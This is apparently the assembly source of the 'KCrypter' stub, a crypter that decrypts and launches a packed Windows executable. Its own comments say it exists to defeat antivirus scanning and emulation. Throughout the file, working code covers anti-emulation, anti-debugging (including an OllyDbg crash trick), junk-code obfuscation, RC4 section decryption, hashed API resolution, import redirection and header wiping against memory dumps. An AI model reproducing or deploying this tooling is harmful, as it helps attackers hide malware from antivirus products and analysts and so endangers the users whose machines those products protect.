;-------------------------------------------------------------------
; KCrypter Stub V1.0 by (C) KOrUPt @ http://KOrUPt.co.uk.
;	This stub is part of the KCrypter project and is not to be re-distributed
;	without the authors prior permission...
;
;	If you don't know what you're doing do not attempt to modify this stub!
;	
;	Done:
;		TLS table support.
;		IAT rebuilding.
;		IAT redirection.
;		Relocation rebuilding.
;		Internal API resolution.
;		Anti-Emulation.
;		Anti-Dump.
;		Anti-Debug.
;		Junk code obfuscation.		
;		Red-pill anti emu.
;		Fake IAT.
;		Section encryption in KCrpyter(Arc4)
;
;		Note: resource encryption is not supported
;		
;	Todo:
;		Implement API emulation.
;		Implement on-demand decryption(guard pages)
;		Implement thread haystack.
;
;	Current decryption key: "KOrUPt2kKCyrptLolWut:p"... 
;		To update search for "szKey:" and update accordingly...
;
;	Please send any suggestions and or death threats to: [my email address]
;  -- compile with nasm.exe stub.asm
;-------------------------------------------------------------------
[bits 32]
section .text
	global _main

%macro __jmp_api 0
	db 0xFF, 0x25 ; mov eax, eax; jmp addr
						; alternative: mov eax, addr; jmp eax
%endmacro

;-------configuration options-----------
; what method shall we use to get kernel32's base address?
   %define use_stack 1
   ;%define use_iat 1	; assumes iat exists
	;%define use_peb 1
; should we use hashes of api names or plaintext?
	%define use_api_hashes 1
	;%define use_api_names 1
; should we include junk code?
	;%define use_junk_code 1
; should we include anti-emulator code?
	%define use_anti_emu 1
		; if so, should we swallow the red-pill?(volatile on multi-core systems)
		;%define use_red_pill 1
; should we modify the imagesize at runtime(anti-dump)
	;%define change_imagesize 1 ; unstable
; should we destroy our PE headers?(volatile)
	;%define destroy_pe_headers 1 ; destroys winrar's gui
; should we use anti-debug?
	;%define use_anti_debug 1 ; unstable
	;should we check for and clear hardware breakpoints?
		;%define clear_hwbps 1 ; unstable
; should we use olly specific anti-debug routines?
	;%define use_olly_specific_anti_dbg 1
;---------------------------------

%ifdef use_junk_code
; junk code
%macro  JUNK_CODE_1 0
	push	eax 			
	push	edx 			
	xor	edx, 0x90		
	push	edx				
	sub	edx, 0x80		
	pop	eax				
	add	eax, edx			
	pop	edx				
	pop	eax				
%endmacro

; more junk code
%macro JUNK_CODE_2 0
	push	eax				
    xor	eax, eax			
    setpo	al				
    push	edx				
    xor	edx, eax			
    sal	edx, 2			
    xchg	eax, edx		
    pop	edx				
    or		eax, ecx			
    pop	eax				
%endmacro
%endif

; -- junk code signature start
; (can be easilly changed via re-arranging junk code)
; AV's entrypoint scan is basically useless
%ifdef use_junk_code
	push eax
	mov	eax, 0xBF8721AD	; this line executes but is stepped over
	JUNK_CODE_1
	and	eax, 0x10
	push	ecx
	add	ecx, 0x90
	pop	ecx
	or		eax, 0x42982124
	pop	eax
	JUNK_CODE_2
%endif
	; -- junk code signature end

_mainjmp:
	cmp esi, 0FFFFFFFFh		; esi is set to the following value when in ollydbg
	jnz _main
	retn

%ifdef use_anti_debug
_standardExceptionHandler:	; exception handler to handle int 0x2d
	xor	eax, eax
	mov	ecx, [esp + 0ch]			; our ctx structure on the stack
	add	dword [ecx + 0b8h], 0x0A
	retn
%endif

%ifdef clear_hwbps	
 _hwbpExceptionHandler:				; clears hardware breakpoints
	xor	eax, eax
    mov	ecx, [esp + 0ch]			; our ctx structure on the stack
	mov	dword [ecx + 08h], eax		; dr1
    mov	dword [ecx + 0ch], eax		; dr2
	mov	dword [ecx + 04h], eax		; dr0
    mov	dword [ecx + 10h], eax		; dr3
    add	dword [ecx + 0b8h], 2		; we add 2 to EIP to skip the div eax
    retn
%endif

;-------------------------------
; main stub code
;-------------------------------
_main:
%ifdef use_anti_emu
	; utilize salc instruction
	inc	bl
	dec 	dl
	cmp	bl, dl 
	push	ss
	pop	ss
	; salc = undocumented intel instruction. 
	;  "sets AL=FF if the CF is set, or resets AL=00 if CF is clear"
	; Most emulators will emulate this instruction as a NOP(which will cause our process to crash)
	; ...instruction will execute but is stepped over due to the push/pop ss
	salc
	test	al, al
	jnz	_noEmu
		xor	eax, eax
		retn
	_noEmu:
	inc	dl
	dec	bl
	
	; Typically an emu will only execute the first 1000 instructions
	; if these instructions aren't malicous, we'll be ok ;)
	push	eax
	push	ecx
	xor	eax, eax
	mov	ecx, 4096
	_antiEmuLoop:
		inc	eax
		or		eax, ecx 
		dec	ecx
		test	ecx, ecx
	jnz	_antiEmuLoop
	pop	ecx
	pop	eax
%endif	

	;-------------------------------
	; our code needs to be relocatable so we need to think relative
	;-------------------------------
	pushad
	call	GetBasePointer
	GetBasePointer:
	pop	ebp
	sub	ebp, 	GetBasePointer
	
	;-------------------------------
	; get kernel32 imagebase(required for when we need to walk its EAT)
	;-------------------------------
%ifdef use_iat
%error "Not implemented yet"
%elif use_stack	
	mov	esi, [esp + 0x20]
	and	esi, 0xFFFF0000
%ifdef use_junk_code	
	JUNK_CODE_1
%endif
	mov	ecx, 0xC800
	_checkMZSignature:
	cmp	word [esi], 0x5A4D	; check for "MZ" signature
	jz	_checkPESignature		; move on, go to PE signature
	_checkNextPage:
		sub	esi, 10000h
		dec	ecx
		jmp	_checkMZSignature
	_checkPESignature:
	mov	edi, [esi + 3Ch]
%ifdef use_junk_code
	JUNK_CODE_2
%endif
	add	edi, esi
	cmp	dword [edi], 0x4550 ; check for "PE" signature
	jnz	_checkNextPage
	mov	[ebp + dwK32BaseAddr], esi
%elif use_peb
	xor	eax, eax
	add	eax, [fs:eax + 30h]
	test	eax, eax
	js os_9x
		mov	eax, [eax + 0ch]
		mov	esi,  [eax + 1ch]
		lodsd
		mov	eax, [eax+8]
		jmp 	finished
	os_9x:
	    mov	eax, [eax + 34h]
	    lea	eax, [eax + 7ch]
	    mov	eax, [eax + 3ch]
	finished:
		mov	[ebp + dwK32BaseAddr], eax
%else
	%error "Please specify a routine to obtain Kernel32's base address", 0
%endif


	;-------------------------------
	; anti-emulation
	;-------------------------------
%ifdef use_anti_emu
%ifdef use_red_pill
	; red-pill... volatile on multicore systems
	sidt	[ebp + sidtOut]
	lea	eax, [ebp + sidtOut]
	add	eax, 5
	cmp	byte [eax], byte 0xd0
	jb _notInMatrix
		popad
		retn	; matrix :/
	_notInMatrix:
%endif	
%endif

	;-------------------------------
	; walk kernel32's EAT and obtain address's of GetProcAddress() and LoadLibrary()
	;-------------------------------
%ifdef use_api_names	
	lea esi, [ebp + szLoadLibrary]
	call GetK32ApiAddress
	mov	[ebp + pLoadLibrary], eax
	lea esi, [ebp + szGetProcAddr]
	call GetK32ApiAddress
	mov	[ebp + pGetProcAddress], eax
	
	; resolve required API's	
	lea	esi, [ebp + szVirtualProtect]
	call	GetK32ApiAddress
	mov	[ebp + pVirtualProtect], eax	
%ifdef use_junk_code
	JUNK_CODE_1
%endif
	lea	esi, [ebp + szVirtualAlloc]
	call	GetK32ApiAddress
	mov	[ebp + pVirtualAlloc], eax

%ifdef use_olly_specific_anti_dbg	; resolve address of olly specific anti-debug api's
	lea	esi, [ebp + szOutputDbgString]
	call	GetK32ApiAddress
	mov	[ebp + pOutputDbgString], eax
%endif	
%elif use_api_hashes
	mov	esi, [ebp + szLoadLibrary]
	call GetK32ApiAddress
	mov	[ebp + pLoadLibrary], eax
	mov	esi, [ebp + szGetProcAddr]
	call GetK32ApiAddress
	mov	[ebp + pGetProcAddress], eax
	
	;-------------------------------
	; resolve required API's	
	;-------------------------------
	mov	esi, [ebp + szVirtualProtect]
	call	GetK32ApiAddress
	mov	[ebp + pVirtualProtect], eax	

	mov	esi, [ebp + szVirtualAlloc]
	call	GetK32ApiAddress
	mov	[ebp + pVirtualAlloc], eax

%ifdef use_olly_specific_anti_dbg
	mov	esi, [ebp + szOutputDbgString]
	call	GetK32ApiAddress
	mov	[ebp + pOutputDbgString], eax
%endif
%ifdef use_junk_code
	JUNK_CODE_1
%endif		
%endif
	
	;-------------------------------
	; set up our jmp table
	;-------------------------------
	lea	eax, [ebp + pLoadLibrary]
	mov [ebp + __jmpLoadLibrary + 2], eax
	
	lea	eax, [ebp + pGetProcAddress]
	mov [ebp + __jmpGetProcAddress + 2], eax
%ifdef use_junk_code
	JUNK_CODE_2
%endif
	lea	eax, [ebp + pVirtualProtect]
	mov	[ebp + __jmpVirtualProtect + 2], eax
	
	lea	eax, [ebp + pVirtualAlloc]
	mov	[ebp + __jmpVirtualAlloc + 2], eax

%ifdef use_olly_specific_anti_dbg	; load required api's
	lea	eax, [ebp + pOutputDbgString]
	mov	[ebp + __jmpOutputDebugString + 2], eax
%endif

	;-------------------------------
	; clear hw breakpoints
	;-------------------------------
%ifdef clear_hwbps
	lea		eax, [ebp + _hwbpExceptionHandler]
	push	eax
	push	dword [fs:0]	; address of previous exception handler
	mov		[fs:0], esp		; write the new handler
    
	xor	eax, eax
    div	eax				; cause an exception
    pop	dword [fs:0]	; execution continues here
    add	esp, 4
%endif

	;-------------------------------
	; anti-debugging
	;-------------------------------
%ifdef use_anti_debug
%ifdef use_olly_specific_anti_dbg	
	; check DebugFlags
	mov	eax, [fs:30h]
	mov	byte al, byte [eax + 2]
	test	al, al
	je _dbgPresentBitClear
		retn
	_dbgPresentBitClear:
	
	; check HeapManipFlags
	mov	eax, [fs:30h]
	mov	eax, [eax+68h]
	and	eax, 0x70
	test	eax, eax 
	je _dbgHeapManipFlagsClear
		retn
	_dbgHeapManipFlagsClear:
%endif
	
	;-------------------------------
	; install our int 0x2d exception handler
	;-------------------------------
	lea	eax, [ebp + _standardExceptionHandler]
	push	eax
	push	dword [fs:0]	; address of previous exception handler
	mov		[fs:0], esp		; write the new handler
	
	int 0x2d				; will throw an exception when not being debugged!
	xor	eax, eax			; if exception is not thrown our application breaks
	add	eax, 2
	lea 	ecx, [eax]		; crash
	retn					; ...and burn
	pop	dword [fs:0]		; >>>> Execution continues here
    add	esp, 4

%ifdef use_olly_specific_anti_dbg	; format string vuln
	lea	eax, [ebp + szFormatStr]
	push	eax
	call	__jmpOutputDebugString
%endif
	;-------------------------------
	; timing attack... Anti-Debug via rdtsc
	;-------------------------------
	rdtsc
	push eax
	push eax
	push ecx
	xor	eax, eax
	mov	ecx, 4096
	_wasteCycles:
		inc	eax
		or		eax, ecx 
		dec	ecx
		test	ecx, ecx
	jnz	_wasteCycles
	pop	ecx
	pop	eax
	rdtsc
	sub	eax, [esp]	;ticks delta
	add	esp, 4
	cmp	eax, 10000h ;threshold
	jb _rdtscNoDebugger
		retn ; oops
	_rdtscNoDebugger:
%endif

	;-------------------------------
	; make PE headers writable
	;-------------------------------
	lea	eax, [ebp + pTemp]
	push	eax						; &pTemp
	push 0x04						; PAGE_READWRITE
	mov	eax, [ebp + dwImagebase]
	add	eax, [eax + 0x3C]			; eax -> IMAGE_NT_HEADERS
	push	dword  [eax + 0x54]
	push	dword [ebp + dwImagebase]
	call __jmpVirtualProtect	; VirtualProtect(dwImagebase, SizeOfHeaders, PAGE_READWRITE, &pTemp)
	test	eax, eax			; we couldn't get write access to the memory region?
	jz _noWritePerms			; crash and burn

	;-------------------------------
	; decrpyt sections
	;-------------------------------
	mov	ebx, [ebp + dwImagebase]	; ebx = imagebase
	mov	eax, ebx					; eax = imagebase
	add	eax, dword [ebx + 3Ch] 		; eax = pe header
	movzx	ecx, word [eax + 6h]	; ecx = number of sections
	add	eax, 0f8h					; pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS)

	mov	[ebp + nSections], ecx		
	mov	[ebp + sectionTable], eax
	
	dec ecx							; last section = iat, section before last = stub
	dec ecx
	
	_decryptSection:
		push	ecx 				; store nSections
		
		; load section table
		mov	eax, [ebp + sectionTable]
		
		_isResourceSection:
		; is this a resource section
		lea edi, [ebp + szRsrcName]		; edi = section name we're filtering, ".RSRC"
		mov	esi, eax					; name of section to decrypt
		call _toupper
		mov ecx, 5						; length of ".RSRC"
		cld								; clear direction flags
		repe	cmpsb					; compare section names
		jz _nextSection 				; got a match? then skip section
	
		lea	edx, [ebp + szKey] 			; load decryption key
		
		; push dwKeyLen
		push edx						; lpKey
		call _strlen
		add	esp, 4
		dec	eax
		push eax						; dwKeyLen
		
		; push dwBufLen(vsize of section)
		mov	eax, [ebp + sectionTable] ; load section table
		add	eax, 0Ch
		mov esi, [eax]		; store virtual address
		add	eax, 4			; obtain size of raw data
		
		push dword [eax]	; dwBufLen
		
		; push lpKey
		push	edx			; lpKey
		
		; push lpBuff
		add		esi, ebx	; add imagebase to virtual address
		push	esi			; lpBuff
		call RC4			; RC4(lpBuf, lpKey, dwBufLen, dwKeyLen)
		add esp, 16
		
		; next section
		_nextSection:
		add dword [ebp + sectionTable], 40		; next section
		pop	ecx									; restore nSections
		dec	ecx									; decrease section count
	jnz _decryptSection
	

	;-------------------------------
	; fix relocation table. taken from Morphine
	;-------------------------------

_reloc_fixup:
    mov	eax, [ebp + dwImagebase]
    mov	edx, eax
    mov	ebx, eax
    add	ebx, [ebx + 3Ch] 						; edi -> IMAGE_NT_HEADERS
    mov	ebx, [ebx + 034h]						; edx ->image_nt_headers->OptionalHeader.ImageBase
    sub	edx, ebx 									; edx -> reloc_correction // delta_ImageBase
    je	_reloc_fixup_end
    mov	ebx, [ebp + dwRelocVa]
    test	ebx, ebx
    jz	_reloc_fixup_end
    add	ebx, eax
_reloc_fixup_block:
    mov	eax, [ebx + 004h]          			; ImageBaseRelocation.SizeOfBlock
    test	eax, eax
    jz	_reloc_fixup_end
    lea	ecx, [eax - 008h]
    shr	ecx, 001h
    lea	edi, [ebx + 008h]
_reloc_fixup_do_entry:
        movzx	eax, word [edi]			; Entry
        push	edx
        mov	edx,eax
        shr	eax, 00Ch            					; Type = Entry >> 12
        mov	esi, [ebp + dwImagebase]	; ImageBase
        and	dx, 00FFFh
        add	esi, [ebx]
        add	esi, edx
        pop	edx
_reloc_fixup_HIGH:              		; IMAGE_REL_BASED_HIGH  
        dec	eax
        jnz _reloc_fixup_LOW
            mov	eax,edx
            shr	eax, 010h        		; HIWORD(Delta)
            jmp	_reloc_fixup_LOW_fixup        
_reloc_fixup_LOW:               		; IMAGE_REL_BASED_LOW 
            dec	eax
        jnz _reloc_fixup_HIGHLOW
        movzx	eax, dx            	; LOWORD(Delta)
_reloc_fixup_LOW_fixup:
            add	word [esi], ax	; mem[x] = mem[x] + delta_ImageBase
        jmp	_reloc_fixup_next_entry
_reloc_fixup_HIGHLOW:        	; IMAGE_REL_BASED_HIGHLOW
            dec	eax
        jnz	_reloc_fixup_next_entry
        add	[esi],edx           	; mem[x] = mem[x] + delta_ImageBase
_reloc_fixup_next_entry:
        inc	edi
        inc	edi						; Entry++
        loop	_reloc_fixup_do_entry
_reloc_fixup_next_base:
    add	ebx, [ebx + 004h]
    jmp	_reloc_fixup_block
_reloc_fixup_end:

	;-------------------------------
	; Destroy PE headers
	;-------------------------------
%ifndef destroy_pe_headers
%ifdef change_imagesize
	; some tools aren't developed to handle abnormal imagesizes...
	mov	eax, [fs:0x30]
	mov	eax, [eax + 0x0c] ; PEB_LDR_DATA
	mov	eax, [eax + 0x0c] ; InOrderModuleList
	mov	dword [eax + 0x20], 0x100000  ; SizeOfImage
%endif
%endif
	
	;-------------------------------
	; rebuild IAT
	;-------------------------------

	lea	eax, [ebp + szDllRedirectionList]
	push	eax
	push	dword [ebp + dwIatVa]
	push	dword [ebp + dwImagebase]
	call	RebuildAndRedirectIat
	_noWritePerms:
	
%ifdef destroy_pe_headers
	;-------------------------------
	; destroy our PE headers. Note: May break some executable's(i.e Winrar's GUI)
	;-------------------------------
	mov	ecx, [ebp + dwImagebase]
	mov	eax, ecx
	add	ecx, [eax + 0x03C]		; eax -> IMAGE_NT_HEADERS
	mov	ecx, [ecx + 0x54]		; ecx = size of headers
	_nullHeaders:
		mov	edx, dword [eax + ecx]
		xor	dword [eax + ecx],  edx
		sub	ecx, 4
		test	ecx, ecx
	jnz _nullHeaders
%endif
	
	;-------------------------------
	; reach oep
	;-------------------------------
	mov	eax, dword [esp + 0x24]		; oops... cya later olly :p
	mov	eax, dword [ebp + dwOEP]
	mov	[esp +0x1C], eax			; hax!
	popad
	push	eax
	xor	eax, eax
	retn
	
	;-------------------------------
	; BELOW ARE FUNCTIONS AND SUBROUTINES USED THROUGHOUT THE STUB
	;-------------------------------
	
	;-------------------------------
	; Input:  Hash of API or name of API in esi
	; Output: Address of API(eax)
	;-------------------------------
	GetK32ApiAddress:
		xor	eax, eax
		mov	edx, esi
		
%ifdef use_api_names
		push	esi
		call	_strlen
		add	esp, 4
		mov	ecx, eax ; ecx = api name string length
%endif
		
		mov	esi, dword [ebp + dwK32BaseAddr]
		add 	esi, 0x3C
		lodsw                             
		
		add	eax, dword [ebp + dwK32BaseAddr]
		mov	esi, [eax + 0x78]
		add	esi, [ebp + dwK32BaseAddr]
		add	esi, 0x1C
		
		lodsd
		add	eax, [ebp + dwK32BaseAddr]
		mov	dword [ebp + dwAddressTableVa], eax
		
		lodsd
		add	eax, [ebp + dwK32BaseAddr]
		push	eax
		
		lodsd
		add	eax, [ebp + dwK32BaseAddr]
		mov	dword [ebp + dwOrdinalTableVa], eax
		pop	esi	; esi = name pointer table VA
		
		; walk EAT API name table
		mov	word [ebp + i], 0
		_gotoNextApi:   
			push	esi
			lodsd
			add	eax, [ebp + dwK32BaseAddr]
			mov	esi, eax    	; esi   = VA of API name
%ifdef use_api_hashes
			call	_HashApiName
			cmp	dword eax, dword edx ; compare hash to hashed api name
%elif 	use_api_names		
			mov	edi, edx		; edx =  to wanted API
			push	ecx			; ecx = API size
			cld
			repe	cmpsb		; compare API names
			pop	ecx
%endif
			jz	_gotApiAddress
				pop	esi      		     
				add	esi, 4               	
				inc	word [ebp + i]       
		jmp _gotoNextApi
			
		_gotApiAddress:   
		pop	esi
		movzx	eax, word [ebp + i]
		shl	eax, 1
		add	eax, dword [ebp + dwOrdinalTableVa]
		xor 	esi, esi                         
		xchg	eax, esi                         
		lodsw                                   
		shl	eax, 2
		add	eax, dword [ebp + dwAddressTableVa]
		mov	esi, eax                        	
		lodsd                                   
		add	eax, [ebp + dwK32BaseAddr]               
		retn


; -------------------------------------------------------------------
; 	RIPPED AND CONVERTED RC4 FUNCTION
;	void RC4(LPBYTE lpBuf, LPBYTE lpKey, DWORD dwBufLen, DWORD dwKeyLen)
;-------------------------------
RC4:                               ;<= Procedure Start
    push    ebp
    mov     ebp, esp
    sub     esp, 0410h
    push    esi
    mov     dword [ebp-8], 0
    mov     dword [ebp-4], 0
    jmp     _rc4_00401093

_rc4_0040108a:

    mov     eax, [ebp-4]
    add     eax, 1
    mov     [ebp-4], eax

_rc4_00401093:

    cmp     word [ebp-4], 0100h
    jge     _rc4_004010ab
    mov     ecx, [ebp-4]
    mov     edx, [ebp-4]
    mov     dword [ebp+ecx*4-0408h], edx
    jmp     _rc4_0040108a

_rc4_004010ab:

    mov     dword [ebp-4], 0
    jmp     _rc4_004010bd

_rc4_004010b4:

    mov     eax, [ebp-4]
    add     eax, 1
    mov     [ebp-4], eax

_rc4_004010bd:

    cmp     word [ebp-4], 0100h
    jge     _rc4_00401134
    mov     ecx, [ebp-4]
    mov     esi, [ebp-8]
    add     esi, dword  [ebp+ecx*4-0408h]
    mov     eax, [ebp-4]
    xor     edx, edx
    div     dword [ebp+0x14]
    mov     eax, [ebp+0xC]
    xor     ecx, ecx
    mov     cl, byte  [eax+edx]
    add     esi, ecx
    and     esi, 0800000ffh
    jns     _rc4_004010f5
    dec     esi
    or      esi, 0ffffff00h
    inc     esi

_rc4_004010f5:

    mov     [ebp-8], esi
    mov     edx, [ebp-4]
    mov     al, byte  [ebp+edx*4-0408h]
    mov     byte  [ebp-0410h], al
    mov     ecx, [ebp-4]
    mov     edx, [ebp-8]
    mov     eax, dword  [ebp+edx*4-0408h]
    mov     dword  [ebp+ecx*4-0408h], eax
    mov     ecx, [ebp-0x410]
    and     ecx, 0ffh
    mov     edx, [ebp-8]
    mov     dword  [ebp+edx*4-0408h], ecx
    jmp     _rc4_004010b4

_rc4_00401134:

    mov     dword [ebp-0x40C], 0
    jmp     _rc4_0040114f

_rc4_00401140:

    mov     eax, [ebp-0x40C]
    add     eax, 1
    mov     [ebp-0x40C], eax

_rc4_0040114f:

    mov     ecx, [ebp-0x40C]
    cmp     ecx, [ebp+0x10]
    jnb     near _rc4_00401217
    mov     edx, [ebp-4]
    add     edx, 1
    and     edx, 0800000ffh
    jns     _rc4_00401174
    dec     edx
    or      edx, 0ffffff00h
    inc     edx

_rc4_00401174:

    mov     [ebp-4], edx
    mov     eax, [ebp-4]
    mov     ecx, [ebp-8]
    add     ecx, dword  [ebp+eax*4-0408h]
    and     ecx, 0800000ffh
    jns     _rc4_00401194
    dec     ecx
    or      ecx, 0ffffff00h
    inc     ecx

_rc4_00401194:

    mov     [ebp-8], ecx
    mov     edx, [ebp-4]
    mov     al, byte  [ebp+edx*4-0408h]
    mov     byte  [ebp-0410h], al
    mov     ecx, [ebp-4]
    mov     edx, [ebp-8]
    mov     eax, dword  [ebp+edx*4-0408h]
    mov     dword  [ebp+ecx*4-0408h], eax
    mov     ecx, [ebp-0x410]
    and     ecx, 0ffh
    mov     edx, [ebp-8]
    mov     dword  [ebp+edx*4-0408h], ecx
    mov     eax, [ebp-4]
    mov     ecx, dword  [ebp+eax*4-0408h]
    mov     edx, [ebp-8]
    add     ecx, dword  [ebp+edx*4-0408h]
    and     ecx, 0800000ffh
    jns     _rc4_004011f5
    dec     ecx
    or      ecx, 0ffffff00h
    inc     ecx

_rc4_004011f5:

    mov     eax, [ebp+8]
    add     eax, [ebp-0x40C]
    mov     dl, byte  [eax]
    xor     dl, byte  [ebp+ecx*4-0408h]
    mov     eax, [ebp+8]
    add     eax, [ebp-0x40C]
    mov     byte  [eax], dl
    jmp     _rc4_00401140

_rc4_00401217:

    pop     esi
    mov     esp, ebp
    pop     ebp
    retn                                     ;<= Procedure End
; -------------------------------------------------------------------


%ifdef use_api_hashes
;-------------------------------
; Input: API name in esi
;  Hashes an API name
;-------------------------------
_HashApiName:	
	xor	eax, eax
	push	edi
	xor	edi, edi
	_generateHash:
	lodsb
	test	al, al
	jz	_hashed
		ror	edi, 0xd
		add	edi, eax
	jmp	_generateHash
	_hashed:
	mov	eax, edi
	pop	edi
	retn
%endif

;-------------------------------
; Make string uppercase
; 	Input: address of string in esi
;-------------------------------
_toupper:
	push	ecx
	xor	ecx, ecx
	_checkChars:
	cmp	byte [esi], 'a'
	jb	_checkNextChar
	cmp	byte [esi], 'z'
	ja	_checkNextChar
	and	byte [esi], 0xDF
	_checkNextChar:
	inc	esi
	inc	ecx
	cmp	byte [esi], 0x00
	jnz	_checkChars
	
	_exitRoutine:
	sub	esi, ecx
	pop	ecx
	retn

_strlen:
	push	edi
	sub	ecx, ecx
	mov	edi, [esp + 8]
	not	ecx
	sub	al, al
	cld
	repne	scasb
	not	ecx
	pop	edi
	lea	eax, [ecx]
	retn

; --------------- fix up the import table ----------------
; ebp+10h	[ebp+_p_szKERNEL32_r]
; ebp+0ch	dwIatVa
; ebp+08h	_p_dwImageBase
; ---------------------------------
; ebp-04h		dwNewIatVa
; ebp-08h		_p_dwThunk
; ebp-0ch		_p_dwHintName
; ebp-10h		_p_dwLibraryName
; ebp-14h		_p_dwAPIaddress
; ebp-18h		_p_dwFuncName
;-------------------------------

RebuildAndRedirectIat:
	push	ebp
	mov	ebp, esp
	add	esp, -18h				; prolog
	push	0x4
	push	0x01000 
	push	0x01D000
	push	0x00
	call	__jmpVirtualAlloc	; dwNewIatVa = VirtualAlloc(NULL, 0x01D000, MEM_COMMIT, PAGE_READWRITE);
	mov	[ebp - 04h], eax
	mov	ebx, [ebp + 0Ch]		; ebx = dwIatVa
	test	ebx, ebx
	jz near  _iatRebuildEnd
	mov	esi, [ebp + 08h]		; esi = imagebase
	add	ebx, esi				; dwImportVirtualAddress += dwImageBase
	_iatLoadLibraryLoop:
		mov	eax, [ebx + 0Ch]	; eax = [dwIatVa + 0Ch] =  image_import_descriptor.Name
		test	eax, eax
		jz near _iatRebuildEnd
		
		mov	ecx, [ebx + 10h]	; ecx = [dwIatVa + 10h]  = image_import_descriptor.FirstThunk
		add	ecx, esi			; ecx += imagebase
		mov	[ebp - 08h], ecx	; dwThunk = ecx
		mov	ecx, [ebx]			; image_import_descriptor.Characteristics
		test	ecx, ecx			; check Characteristics != NULL
		jnz _iatGotCharacteristics
			mov	ecx, [ebx + 10h] ; characteristics, use OriginalFirstThunk
		_iatGotCharacteristics:
		add	ecx, esi					 ; ecx += imagebase
		mov	[ebp - 0Ch], ecx		 ; store dwHintName
		add	eax, esi				 ; image_import_descriptor.Name + dwImageBase = ModuleName
		push	eax						 ; lpLibFileName
		mov	[ebp - 10h], eax		 ; pLibraryName = eax = ModuleName
		call	__jmpLoadLibrary		 ; LoadLibrary(lpLibFileName);
		test	eax, eax				 ; library loaded successfully?
		jz	near _iatRebuildEnd				 ; if not, fail epically...
		mov	edi, eax				 ; edi = hDllHandle
		_iatGetProcAddrLoop:
			mov	ecx, [ebp - 0ch]	 ; ecx = dwHintName
			mov	edx, [ecx]			 ; edx =  image_thunk_data.Ordinal
			test	edx, edx			 ; do we have more functions to import?
			jz	near _iatCheckNextModule	; no? next module
			test	edx, 080000000h		; are we importing by ordinal?
			jz	_iatUseName 				; no? ok use the function names
				and	edx, 07FFFFFFFh		; otherwise, get ordinal
				jmp _iatGetFuncAddress

		_iatUseName:
			add	edx, esi	; image_thunk_data.Ordinal + dwImageBase = OrdinalName
			inc	edx			; ...
			inc	edx			; edx = OrdinalName.Name

		_iatGetFuncAddress:
			mov	[ebp - 18h], edx

			push	edx	; lpProcName
			push	edi	; hModule						
			call	__jmpGetProcAddress
			mov	[ebp - 14h], eax	; dwAPIaddress
			
			;-------------------------------
			; API redirection...
			; mov 	[ecx], eax	; ...typically we'd fill this in and move onto the next module...
			; ...but we need to check for API's we want to redirect
			;-------------------------------
			
			push	edi	; store hModule
			push	esi	; store imagebase
			push	ebx	; store dwImportVirtualAddress += dwImageBase
			
			; make pLibraryName uppercase
			mov	esi, [ebp - 10h]	; esi  = pLibraryName
			call _toupper
			
			mov	edi, [ebp + 010h]	; edi  = [ebp + szDllRedirectionList]
			
			_iatCheckRedirectionList:
			push	edi
			call	_strlen
			add	esp, 4
			mov ecx, eax		; ecx = redirection library name length
			
			; do we want to redirect calls from within this dll? ...
			push	edi			; store edi = dll redirection library name
			push	esi			; store esi = current library name
			
			push	ecx			; store ecx = dll redirection library name length
			cld					; clear direction flags
			repe	cmpsb		; compare library names
			pop	ecx			; restore dll redirection library length
			jz _iatUseRedirection 	; got a match?
			pop	esi					; restore library name
			pop	edi					; restore dll redirection list
			add	edi, ecx			; move onto next dll in redirection list
			cmp	dword [edi], 0x0	; end of dll redirection list?
			jnz _iatCheckRedirectionList
			; don't use redirection...
			mov	ecx, [ebp - 08h]		; ecx = dwThunk
			mov	eax, [ebp - 014h]		; eax = dwApiAddress
			mov	[ecx], eax				; func address written!
			jmp _iatCheckNextFunction	; next function :D
			
			_iatUseRedirection:
			; use redirection 
				pop	esi	; restore library name
				pop	edi	; restore dll redirection list
				mov	edi, [ebp - 04h]	; edi = dwNewIatVa
				mov	byte [edi], 0e9h	; byte [edi] = 0xE9(prep for jmp)
				
				; TODO: check if this API matches one we want to emulate/redirect
				
				mov	eax, [ebp - 14h] ; eax = dwApiAddress
				; calc for jump
				sub	eax, edi
				sub	eax, 05h
				; write api address + jmp opcode
				mov	[edi + 1], eax
				mov	word [edi + 05], 0C08Bh
				mov	ecx, [ebp - 08h] 			; ecx = dwThunk 
				mov	[ecx], edi					; func address written!
				add	dword [ebp - 04h], 07h 		; dwNewIatVa += 07h
			_iatCheckNextFunction:				; next module!!
			pop	ebx	; restore dwImportVirtualAddress += dwImageBase
			pop	esi	; restore imagebase
			pop	edi	; restore hmodule
			add	dword [ebp - 08h], 004h	; dwThunk => next dwThunk
			add	dword [ebp - 0ch], 004h	; dwHintName => next dwHintName
		jmp _iatGetProcAddrLoop
	_iatCheckNextModule:
		add	ebx, 014h	; sizeof(IMAGE_IMPORT_DESCRIPTOR)
	jmp _iatLoadLibraryLoop
	_iatRebuildEnd:
	mov	esp, ebp 	; < epilog
	pop	ebp
	retn 	0ch
	
;-----------------------------------------------------------
	; important data and variable's(filled in by crypter, do NOT modify)
	; do not modify the order of any variable's who's contents == 0xCCCCCCCC
	dwOEP:					dd(0xCCCCCCCC) 
								db(0x00)
	dwImagebase:			dd(0xCCCCCCCC)
								db(0x00)
	dwIatVa:				dd(0xCCCCCCCC) 
								db(0x00)
	
	; misc variable's
	szKey:				db "HavocReigns", 0
	szRsrcName:			db ".RSRC", 0   ; DO NOT MODIFY
	pTemp:				dd(0xFFFFFFFF)
	dwK32BaseAddr:		dd(0xFFFFFFFF)
	dwOrdinalTableVa:	dd(0xFFFFFFFF)
	dwAddressTableVa:	dd(0xFFFFFFFF)
	dwThunk:			dd(0xFFFFFFFF)
	dwHintName:			dd(0xFFFFFFFF)
	i:					dw(0x0000)
	
%ifdef use_olly_specific_anti_dbg
	szFormatStr:		db "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"
						db "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s", 0
%endif
	
	; section table variable's...
	sectionTable:			dd(0xFFFFFFFF)
	nSections:				dw(0x0000)

%ifdef use_anti_emu
	sidtOut:				dd(0xFFFFFFFF)
							dw(0xFFFF)
%endif

	; backed up TLS table(DO NOT MOVE)
	_tls_dwStartAddressOfRawData:	dd(0xCCCCCCCC)
	_tls_dwEndAddressOfRawData:		dd(0xCCCCCCCC)
	_tls_dwAddressOfIndex:			dd(0xCCCCCCCC)
	_tls_dwAddressOfCallBacks:		dd(0xCCCCCCCC)
	_tls_dwSizeOfZeroFill:			dd(0xCCCCCCCC)
